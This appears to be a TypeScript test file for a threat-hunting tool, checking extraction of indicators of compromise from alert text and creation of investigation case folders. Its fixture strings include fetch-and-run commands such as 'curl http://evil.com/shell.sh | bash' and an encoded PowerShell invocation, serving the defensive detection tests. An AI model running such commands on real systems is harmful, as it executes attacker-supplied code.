import { describe, test, expect } from "bun:test"
import { extractIocs, createCase } from "../hunt/case.ts"
import { mkdtemp, readFile, rm, access } from "node:fs/promises"
import { join } from "node:path"
import { tmpdir } from "node:os"
import type { CaseSource } from "../types.ts"

// =============================================================================
// extractIocs
// =============================================================================

describe("extractIocs", () => {
  test("extracts IPv4 addresses", () => {
    const iocs = extractIocs("Observed traffic to 192.168.1.1 and 10.0.0.254")
    const ips = iocs.filter((i) => i.type === "ip")
    expect(ips).toHaveLength(2)
    expect(ips.map((i) => i.value)).toContain("192.168.1.1")
    expect(ips.map((i) => i.value)).toContain("10.0.0.254")
  })

  test("extracts boundary IPv4 values", () => {
    const iocs = extractIocs("255.255.255.255 and 0.0.0.0")
    const ips = iocs.filter((i) => i.type === "ip")
    expect(ips).toHaveLength(2)
    expect(ips.map((i) => i.value)).toContain("255.255.255.255")
    expect(ips.map((i) => i.value)).toContain("0.0.0.0")
  })

  test("does not match invalid IPs", () => {
    const iocs = extractIocs("999.999.999.999 is not a valid IP")
    const ips = iocs.filter((i) => i.type === "ip")
    // The regex uses octet-level validation (25[0-5]|2[0-4]\d|[01]?\d\d?)
    // so 999.999.999.999 should not match as a full IP
    expect(ips.every((i) => i.value !== "999.999.999.999")).toBe(true)
  })

  test("extracts domains with common TLDs", () => {
    const iocs = extractIocs("C2 beacon to evil.com and malware.io found")
    const domains = iocs.filter((i) => i.type === "domain")
    expect(domains.map((i) => i.value)).toContain("evil.com")
    expect(domains.map((i) => i.value)).toContain("malware.io")
  })

  test("extracts subdomains", () => {
    const iocs = extractIocs("Resolved to c2.attacker.net and stage1.bad.org")
    const domains = iocs.filter((i) => i.type === "domain")
    expect(domains.map((i) => i.value)).toContain("c2.attacker.net")
    expect(domains.map((i) => i.value)).toContain("stage1.bad.org")
  })

  test("does not extract domains with unsupported TLDs", () => {
    const iocs = extractIocs("something.zzzzz is not a real TLD")
    const domains = iocs.filter((i) => i.type === "domain")
    expect(domains.every((d) => d.value !== "something.zzzzz")).toBe(true)
  })

  test("extracts MD5 hashes (32 hex chars)", () => {
    const md5 = "d41d8cd98f00b204e9800998ecf8427e"
    const iocs = extractIocs(`Hash: ${md5}`)
    const hashes = iocs.filter((i) => i.type === "hash")
    expect(hashes.map((i) => i.value)).toContain(md5)
  })

  test("extracts SHA1 hashes (40 hex chars)", () => {
    const sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    const iocs = extractIocs(`SHA1: ${sha1}`)
    const hashes = iocs.filter((i) => i.type === "hash")
    expect(hashes.map((i) => i.value)).toContain(sha1)
  })

  test("extracts SHA256 hashes (64 hex chars)", () => {
    const sha256 =
      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    const iocs = extractIocs(`SHA256: ${sha256}`)
    const hashes = iocs.filter((i) => i.type === "hash")
    expect(hashes.map((i) => i.value)).toContain(sha256)
  })

  test("extracts URLs", () => {
    const iocs = extractIocs(
      "Download from https://evil.com/payload.exe and http://10.0.0.1/stage2",
    )
    const urls = iocs.filter((i) => i.type === "url")
    expect(urls).toHaveLength(2)
    expect(urls.map((i) => i.value)).toContain(
      "https://evil.com/payload.exe",
    )
    expect(urls.map((i) => i.value)).toContain("http://10.0.0.1/stage2")
  })

  test("extracts email addresses", () => {
    const iocs = extractIocs(
      "Phishing from attacker@evil.com targeting admin@company.org",
    )
    const emails = iocs.filter((i) => i.type === "email")
    expect(emails).toHaveLength(2)
    expect(emails.map((i) => i.value)).toContain("attacker@evil.com")
    expect(emails.map((i) => i.value)).toContain("admin@company.org")
  })

  test("extracts file paths", () => {
    const iocs = extractIocs(
      "Payload dropped at /tmp/evil.sh and persistence in /etc/cron.d/backdoor",
    )
    const paths = iocs.filter((i) => i.type === "file_path")
    expect(paths.map((i) => i.value)).toContain("/tmp/evil.sh")
    expect(paths.map((i) => i.value)).toContain("/etc/cron.d/backdoor")
  })

  test("extracts paths under /Users and /Program Files", () => {
    const iocs = extractIocs(
      "Binary found at /Users/admin/malware.exe and /Program Files/trojan/svc.dll",
    )
    const paths = iocs.filter((i) => i.type === "file_path")
    expect(paths.map((i) => i.value)).toContain("/Users/admin/malware.exe")
    expect(paths.map((i) => i.value)).toContain("/Program Files/trojan/svc.dll")
  })

  test("extracts commands", () => {
    const iocs = extractIocs(
      "Attacker ran: powershell -EncodedCommand ZWNobyAiaGVsbG8i and curl http://evil.com/shell.sh | bash",
    )
    const cmds = iocs.filter((i) => i.type === "command")
    expect(cmds.length).toBeGreaterThanOrEqual(1)
    // Should find powershell command
    expect(cmds.some((c) => c.value.includes("powershell"))).toBe(true)
  })

  test("deduplicates identical IOCs", () => {
    const iocs = extractIocs(
      "192.168.1.1 was seen first, then 192.168.1.1 appeared again, 192.168.1.1 a third time",
    )
    const ips = iocs.filter((i) => i.type === "ip" && i.value === "192.168.1.1")
    expect(ips).toHaveLength(1)
  })

  test("returns empty array for empty text", () => {
    const iocs = extractIocs("")
    expect(iocs).toEqual([])
  })

  test("returns empty array for text with no IOCs", () => {
    const iocs = extractIocs(
      "This is just a normal message with no indicators of compromise.",
    )
    expect(iocs).toEqual([])
  })

  test("extracts mixed IOC types from a single message", () => {
    const text = `Alert: Connection from 192.168.1.100 to evil.com
    downloading https://evil.com/payload.exe
    MD5: d41d8cd98f00b204e9800998ecf8427e
    Phishing from attacker@evil.com
    Dropped to /tmp/payload.bin
    Ran: curl http://evil.com/stage2 | bash -c something here`

    const iocs = extractIocs(text)
    const types = new Set(iocs.map((i) => i.type))

    expect(types.has("ip")).toBe(true)
    expect(types.has("domain")).toBe(true)
    expect(types.has("url")).toBe(true)
    expect(types.has("hash")).toBe(true)
    expect(types.has("email")).toBe(true)
    expect(types.has("file_path")).toBe(true)
  })

  test("handles text with special characters", () => {
    const iocs = extractIocs(
      "IP: <192.168.1.1> in brackets and 'evil.com' in quotes",
    )
    const ips = iocs.filter((i) => i.type === "ip")
    expect(ips.map((i) => i.value)).toContain("192.168.1.1")
  })

  test("handles multiline input", () => {
    const text = `Line 1: 10.0.0.1
Line 2: evil.com
Line 3: nothing here`
    const iocs = extractIocs(text)
    expect(iocs.filter((i) => i.type === "ip")).toHaveLength(1)
    expect(iocs.filter((i) => i.type === "domain")).toHaveLength(1)
  })

  test("SHA256 does not also match as SHA1 or MD5 substring", () => {
    // A 64-char hex string could theoretically overlap with 40 or 32 char matches
    // if the regex isn't careful, but the word-boundary anchors prevent this
    const sha256 =
      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    const iocs = extractIocs(sha256)
    const hashes = iocs.filter((i) => i.type === "hash")
    // The 64-char match should be found; check no spurious shorter matches
    expect(hashes.some((h) => h.value === sha256)).toBe(true)
  })

  test("standalone SHA1 does not produce spurious MD5 substring match", () => {
    const sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    const iocs = extractIocs(`SHA1: ${sha1}`)
    const hashes = iocs.filter((i) => i.type === "hash")
    // Should find the SHA1 (40-char) — not a 32-char MD5 substring of it
    expect(hashes).toHaveLength(1)
    expect(hashes[0].value).toBe(sha1)
  })

  test("does not extract defanged IPs (documents limitation)", () => {
    // Defanged IOCs like 192[.]168[.]1[.]1 are common in threat intel reports
    // The current extractor does NOT handle them — this test documents that
    const iocs = extractIocs("Beacon to 192[.]168[.]1[.]1 and 10[.]0[.]0[.]1")
    const ips = iocs.filter((i) => i.type === "ip")
    expect(ips).toHaveLength(0)
  })

  test("does not extract defanged domains (documents limitation)", () => {
    // hxxps:// and evil[.]com are defanged forms used in reports
    const iocs = extractIocs("C2 at hxxps://evil[.]com/payload")
    const domains = iocs.filter((i) => i.type === "domain")
    const urls = iocs.filter((i) => i.type === "url")
    expect(domains).toHaveLength(0)
    expect(urls).toHaveLength(0)
  })
})

// =============================================================================
// createCase
// =============================================================================

describe("createCase", () => {
  let tmpDir: string

  const makeSource = (
    overrides: Partial<CaseSource> = {},
  ): CaseSource => ({
    origin: "slash_command",
    channelId: "C0123456",
    userId: "U9876543",
    rawText: "Suspicious connection to 192.168.1.100",
    extractedIocs: [{ type: "ip", value: "192.168.1.100" }],
    ...overrides,
  })

  test("creates case directory structure", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const result = await createCase(tmpDir, "Test Case Alpha", makeSource())

      expect(result.slug).toBe("test-case-alpha")
      expect(result.title).toBe("Test Case Alpha")
      expect(result.caseDir).toContain(".planning/cases/test-case-alpha")

      // Verify directories exist — access() resolves (not rejects) if path exists
      const receiptsExists = await access(join(result.caseDir, "RECEIPTS")).then(() => true, () => false)
      const queriesExists = await access(join(result.caseDir, "QUERIES")).then(() => true, () => false)
      expect(receiptsExists).toBe(true)
      expect(queriesExists).toBe(true)
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("writes MISSION.md with correct content", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const source = makeSource({
        rawText: "Alert: C2 beacon detected from 10.0.0.5",
        extractedIocs: [
          { type: "ip", value: "10.0.0.5" },
          { type: "domain", value: "evil.com" },
        ],
      })
      const result = await createCase(tmpDir, "C2 Beacon Hunt", source)

      const missionContent = await readFile(
        join(result.caseDir, "MISSION.md"),
        "utf8",
      )

      expect(missionContent).toContain("# Mission: C2 Beacon Hunt")
      expect(missionContent).toContain("**Mode:** hunt")
      expect(missionContent).toContain(`<@${source.userId}>`)
      expect(missionContent).toContain("Alert: C2 beacon detected from 10.0.0.5")
      expect(missionContent).toContain("**ip**: `10.0.0.5`")
      expect(missionContent).toContain("**domain**: `evil.com`")
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("writes HYPOTHESES.md with network indicator hypothesis when IPs present", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const source = makeSource({
        extractedIocs: [{ type: "ip", value: "10.0.0.5" }],
      })
      const result = await createCase(tmpDir, "Network Hunt", source)

      const content = await readFile(
        join(result.caseDir, "HYPOTHESES.md"),
        "utf8",
      )

      expect(content).toContain("# Hypotheses")
      expect(content).toContain("C2 infrastructure")
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("writes HYPOTHESES.md with hash hypothesis when hashes present", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const source = makeSource({
        extractedIocs: [
          { type: "hash", value: "d41d8cd98f00b204e9800998ecf8427e" },
        ],
      })
      const result = await createCase(tmpDir, "Malware Hash Hunt", source)

      const content = await readFile(
        join(result.caseDir, "HYPOTHESES.md"),
        "utf8",
      )

      expect(content).toContain("malware family")
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("writes default hypothesis when no network/hash IOCs", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const source = makeSource({
        extractedIocs: [{ type: "email", value: "bad@evil.com" }],
      })
      const result = await createCase(tmpDir, "Email Phish", source)

      const content = await readFile(
        join(result.caseDir, "HYPOTHESES.md"),
        "utf8",
      )

      expect(content).toContain("true positive")
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("slugifies titles correctly", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const result = await createCase(
        tmpDir,
        "URGENT!! C2 Beacon (Phase 1) -- Response",
        makeSource(),
      )

      expect(result.slug).toBe("urgent-c2-beacon-phase-1-response")
      expect(result.slug).not.toMatch(/^-/)
      expect(result.slug).not.toMatch(/-$/)
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("truncates long slugs to 60 characters", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const longTitle =
        "This is a very long title that should be truncated to sixty characters at most"
      const result = await createCase(tmpDir, longTitle, makeSource())

      expect(result.slug.length).toBeLessThanOrEqual(60)
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })

  test("MISSION.md scope shows manual scoping message when no IOCs", async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "ioc-test-"))
    try {
      const source = makeSource({ extractedIocs: [] })
      const result = await createCase(tmpDir, "No IOC Case", source)

      const content = await readFile(
        join(result.caseDir, "MISSION.md"),
        "utf8",
      )

      expect(content).toContain("manual scoping required")
    } finally {
      await rm(tmpDir, { recursive: true, force: true })
    }
  })
})
